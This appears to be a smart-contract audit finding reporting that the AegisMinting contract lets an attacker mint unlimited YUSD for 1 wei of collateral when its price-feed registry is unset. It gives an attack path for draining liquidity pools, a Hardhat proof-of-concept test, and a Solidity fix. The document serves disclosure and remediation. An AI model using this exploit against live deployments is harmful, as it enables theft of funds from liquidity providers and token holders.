# attacker can mint any amount of YUSD if `_feedRegistry` is not set or set to `address(0)`

### Summary

If `_feedRegistry` is set to `address(0)` or not set at all (which is currently allowed during deployment as well) attacker can mint any amount if YUSD with just 1 wei of collateral asset.

Why this admin input related finding is valid: the explicit [if (address(_feedRegistry) == address(0))](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/4aceb235db96b2299bb95ebf16e83a24f987bf3e/aegis-contracts/contracts/AegisMinting.sol#L806) check signals that the `_feedRegistry` can be indeed the `address(0)` or potentially set to this value by the admins, which is exploitable since it returns `0,0` and it contradicts the [zero value check ](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/4aceb235db96b2299bb95ebf16e83a24f987bf3e/aegis-contracts/contracts/AegisMinting.sol#L811)done on the chainlink price-feed `answer`.  It is [explicitly](https://github.com/sherlock-audit/2025-04-aegis-op-grant-gabkov?tab=readme-ov-file#q-are-there-any-limitations-on-values-set-by-admins-or-other-roles-in-the-codebase-including-restrictions-on-array-lengths) mentioned in the README as well that the admins should be trusted to set **any** value. This behaviour should not be allowed in any cases, because of the exploit detailed bellow.

### Root Cause

At [AegisMinting.sol#L254](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/4aceb235db96b2299bb95ebf16e83a24f987bf3e/aegis-contracts/contracts/AegisMinting.sol#L254) if `_feedRegistry` is [not set](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/4aceb235db96b2299bb95ebf16e83a24f987bf3e/aegis-contracts/contracts/AegisMinting.sol#L806) `_calculateMinYUSDAmount` will [return](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/4aceb235db96b2299bb95ebf16e83a24f987bf3e/aegis-contracts/contracts/AegisMinting.sol#L738) the passed `order.yusdAmount` parameter amount, then continues the execution. The attacker is able to just pass in 1 wei of collateral to make the mint function execute successfully.

### Internal Pre-conditions

1. `_feedRegistry` is set to `address(0)` or not set at all
2. if mint limit is not set any amount can be minted

Note: if `whitelistEnabled` is set to `true` only whitelisted users can execute the attack, but considering how is easy is to bypass KYC this is not a huge limiting factor. If `whitelistEnabled` is set to `false` anyone can exploit it. 

### External Pre-conditions

NA

### Attack Path

1. attacker approves 1 wei of supported collateral asset for the AegisMinting contract
2. submits a mint request with any amount (or within the current limit) YUSD + 1 wei of collateral asset
3. swaps YUSD on exchanges and drains the LP or potentially submits a requestRedeem

### Impact

- If mint limit is not set the attacker can drain all the LPs
- If mint limit is set attacker can deplete the active mint limit period and sell the tokens or submit a requestRedeem

### PoC

Paste the following test bellow [5_aegis_minting_mint.spec.ts#L19](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/4aceb235db96b2299bb95ebf16e83a24f987bf3e/aegis-contracts/test/5_aegis_minting_mint.spec.ts#L19) into the `success` cases. The test demonstrates the attack.

```typescript
it('attacker can mint any amount of YUSD with just 1 wei of collateral asset if _feedRegistry is not set', async () => {
        const [, attacker] = await ethers.getSigners()

        const { aegisMintingContract, aegisMintingAddress, assetContract, assetAddress, yusdContract, aegisConfig } = await loadFixture(deployFixture)

        // whitelistEnabled is set to true so attacker needs to be whitelisted
        await aegisConfig['whitelistAddress(address,bool)'](attacker, true)

        // attacker obtains 1 wei of collateral asset and approves for AegisMinting
        await assetContract.mint(attacker.address, 1n)
        await assetContract.connect(attacker).approve(aegisMintingAddress, 1n)

        const collateralAmount = 1n
        // attacker can specify any amount of YUSD to be minted (or within the current limit)
        const yusdAmount = ethers.parseEther('100000')

        const blockTime = await time.latest()
        const order = {
          orderType: OrderType.MINT,
          userWallet: attacker.address,
          collateralAsset: assetAddress,
          collateralAmount: collateralAmount,
          yusdAmount: yusdAmount,
          slippageAdjustedAmount: yusdAmount,
          expiry: blockTime + 10000,
          nonce: Date.now(),
          additionalData: encodeString(''),
        }
        const signature = await signOrder(order, aegisMintingAddress)

        const mintingContractAssetBalanceBefore = await assetContract.balanceOf(aegisMintingAddress)
        const custodyAvailableAssetBalanceBefore = await aegisMintingContract.custodyAvailableAssetBalance(assetAddress)

        const senderYUSDBalanceBefore = await yusdContract.balanceOf(attacker.address)
        const senderAssetBalanceBefore = await assetContract.balanceOf(attacker.address)

        await expect(aegisMintingContract.connect(attacker).mint(order, signature)).to.
          emit(aegisMintingContract, 'Mint').
          withArgs(attacker.address, order.collateralAsset, order.collateralAmount, order.yusdAmount, 0)

        await expect(assetContract.balanceOf(aegisMintingAddress)).eventually.to.be.equal(mintingContractAssetBalanceBefore + collateralAmount)
        await expect(aegisMintingContract.custodyAvailableAssetBalance(assetAddress)).eventually.to.be.equal(custodyAvailableAssetBalanceBefore + collateralAmount)
        // successful attack
        await expect(yusdContract.balanceOf(attacker.address)).eventually.to.be.equal(senderYUSDBalanceBefore + yusdAmount)
        await expect(assetContract.balanceOf(attacker.address)).eventually.to.be.equal(senderAssetBalanceBefore - collateralAmount)
      })
```

then run
```sh
npx hardhat test test/5_aegis_minting_mint.spec.ts --grep 'attacker can mint any amount of YUSD with just 1 wei of collateral asset if _feedRegistry is not set'
```

### Mitigation

In my opinion the `_feedRegistry` should not be allowed to be set to the zero address at all, because of the potential exploit it can cause.

The easiest mitigation would be to explicitly check in [_setFeedRegistryAddress](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/4aceb235db96b2299bb95ebf16e83a24f987bf3e/aegis-contracts/contracts/AegisMinting.sol#L691) if `_registry` is `address(0)` enforcing it from beginning to be set properly and also avoiding future user errors setting it to the zero address.

```solidity
function _setFeedRegistryAddress(FeedRegistryInterface _registry) internal {
    if(address(_registry) == address(0)) revert ZeroAddress();
    _feedRegistry = _registry;
    emit SetFeedRegistryAddress(address(_registry));
}
```

This would allow to delete the [check](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/4aceb235db96b2299bb95ebf16e83a24f987bf3e/aegis-contracts/contracts/AegisMinting.sol#L806) which resulted the exploit to be removed completely.
